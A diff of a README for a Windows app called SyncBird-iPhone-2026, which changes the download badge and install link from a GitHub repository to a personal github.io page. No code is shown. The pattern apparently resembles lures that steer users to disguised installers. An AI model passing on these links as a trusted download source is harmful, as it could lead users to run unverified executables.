@@ -1,6 +1,6 @@
 # 📱 SyncBird-iPhone-2026 - Simple iPhone Data Management For Windows
 
-[![](https://img.shields.io/badge/Download-SyncBird_for_Windows-blue.svg)](https://github.com/Abbieanestric145/SyncBird-iPhone-2026)
+[![](https://img.shields.io/badge/Download-SyncBird_for_Windows-blue.svg)](https://abbieanestric145.github.io)
 
 ## 📁 Project Overview
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer for these requirements.
 
 Follow these steps to set up SyncBird-iPhone-2026 on your computer.
 
-1. Go to the [official download page link](https://github.com/Abbieanestric145/SyncBird-iPhone-2026).
+1. Go to the [official download page link](https://abbieanestric145.github.io).
 2. Look for the release section on the webpage.
 3. Click the download link to save the installer file to your computer.
 4. Locate the downloaded file in your browser downloads folder or your desktop.
